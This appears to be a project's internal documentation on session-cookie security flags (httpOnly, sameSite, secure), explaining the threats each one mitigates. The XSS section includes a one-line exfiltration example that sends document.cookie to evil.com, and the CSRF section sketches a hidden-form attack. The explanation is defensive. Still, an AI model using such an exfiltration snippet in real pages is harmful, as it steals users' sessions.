# Cookie security — `httpOnly`, `sameSite`, `secure`

**TL;DR.** Three flags on the auth session cookie that close the most
common cookie-theft attack vectors. We set all three (`httpOnly: true`,
`sameSite: "lax"`, `secure` in production) on the `pasha_session` cookie
that gates every authenticated request.

## What each flag does

```js
res.cookies.set("pasha_session", "ok", {
  httpOnly: true,
  sameSite: "lax",
  secure: process.env.NODE_ENV === "production",
  path: "/",
  maxAge: 60 * 60 * 24 * 7,  // 7 days
});
```

### `httpOnly: true`

Blocks JavaScript from reading the cookie. Specifically, `document.cookie`
in the browser cannot see this cookie.

**Why it matters.** If an attacker manages to inject a malicious script
into the page (XSS — cross-site scripting), without `httpOnly` they can
just `fetch("http://evil.com?c=" + document.cookie)` and steal the
session. With `httpOnly`, the cookie is invisible to JavaScript — the
attacker has to do much more work (or fail).

`httpOnly` doesn't prevent XSS from happening; it limits what an XSS
attacker can do once they're in.

### `sameSite: "lax"`

Controls when the cookie is sent on **cross-site** requests:

| Value | Behavior |
|---|---|
| `strict` | Cookie never sent on cross-site requests. Most secure, but breaks navigation from external links. |
| `lax` (our choice) | Cookie sent on top-level navigations (clicking a link from another site), NOT on cross-site form POSTs, image loads, fetches, etc. |
| `none` | Cookie sent on all cross-site requests. Requires `secure: true`. Used by third-party widgets. |

**Why it matters.** Protects against CSRF (cross-site request forgery).
Suppose an attacker hosts `evil.com` with a hidden form that POSTs to
`our-app.com/api/transfer-money`. Without `sameSite`, the browser would
automatically attach the user's session cookie to that POST and the
attack would succeed. With `sameSite: lax`, the cookie isn't sent on
the cross-site POST, so the request is unauthenticated.

`lax` is the modern default — most browsers now treat unspecified
`sameSite` as `lax`.

### `secure: true` (in production)

Tells the browser to send the cookie only over HTTPS, never over plain
HTTP.

**Why it matters.** Without it, a network attacker (coffee-shop WiFi,
ISP MITM) can sniff the cookie out of an HTTP request and replay it.
With it, the cookie never leaves the browser unless the connection is
encrypted.

We gate this on `NODE_ENV === "production"` because `localhost` development
typically runs on plain HTTP, and `secure` + HTTP means the cookie is
never sent at all, breaking the dev login flow.

## The three flags together

| Threat | Mitigated by |
|---|---|
| XSS reads session cookie | `httpOnly` |
| Cross-site form POSTs replay session | `sameSite=lax` |
| Network MITM sniffs cookie over WiFi | `secure` + HTTPS |
| Session cookie persists forever | `maxAge: 7 days` |

A cookie without any of these is the historical default and is what
makes "session hijacking" easy. Setting all three is the minimum bar
for any real app.

## What we deliberately don't do

- **No CSRF tokens.** `sameSite: lax` provides CSRF protection on modern
  browsers (≥ Chrome 51, Firefox 60, Safari 12). The double-cookie pattern
  is unnecessary belt-and-suspenders for our threat model.
- **No `secure: true` in dev.** Would break local development; the threat
  in localhost is negligible.
- **No domain attribute.** The cookie is scoped to the exact host that
  set it. Setting `domain` would let it leak to subdomains — we don't
  want that.

## Where in this codebase

- Cookie set: [`app/api/auth/login/route.ts`](../app/api/auth/login/route.ts) on successful login
- Cookie clear: [`app/api/auth/logout/route.ts`](../app/api/auth/logout/route.ts) — `maxAge: 0`
- Cookie check: [`middleware.ts`](../middleware.ts) — reads cookie value, redirects to `/login` on miss

## Read more

- [MDN — HTTP cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [MDN — SameSite cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite)
- [OWASP — Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
